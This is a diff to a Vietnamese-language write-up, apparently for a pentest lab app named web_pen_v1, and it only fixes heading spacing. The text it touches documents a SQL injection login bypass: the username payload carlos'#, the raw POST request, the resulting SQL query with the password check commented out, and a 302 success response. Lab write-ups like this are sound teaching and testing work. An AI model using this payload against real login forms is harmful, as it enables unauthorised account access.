@@ -95,7 +95,7 @@ Website được xây dựng theo mô hình **MVC (Model-View-Controller)** và 
 Username: carlos'#
 Password: (bất kỳ)
 ```
-####🖥 2. Request Gửi Đến Server:
+#### 🖥 2. Request Gửi Đến Server:
 --------------------------------
 ```
 POST /web_pen_v1/login/process HTTP/1.1
@@ -104,18 +104,18 @@ Content-Type: application/x-www-form-urlencoded
 
 username=carlos'#&password=randompassword
 ```
-####🛠 3. Truy Vấn SQL Bị Thao Túng:
+#### 🛠 3. Truy Vấn SQL Bị Thao Túng:
 --------------------------------
 ```
 SELECT * FROM users WHERE username = 'carlos'#' AND password = 'randompassword';
 ```
 
-####✅ 4. Response Thành Công:
+#### ✅ 4. Response Thành Công:
 --------------------------------
 HTTP/1.1 302 Found
 Location: /home.php
 
-####🚨 5. Ảnh Chụp Màn Hình:
+#### 🚨 5. Ảnh Chụp Màn Hình:
 --------------------------------
 | PoC SQL Injection | Burp Suite PoC |
 |---|---|
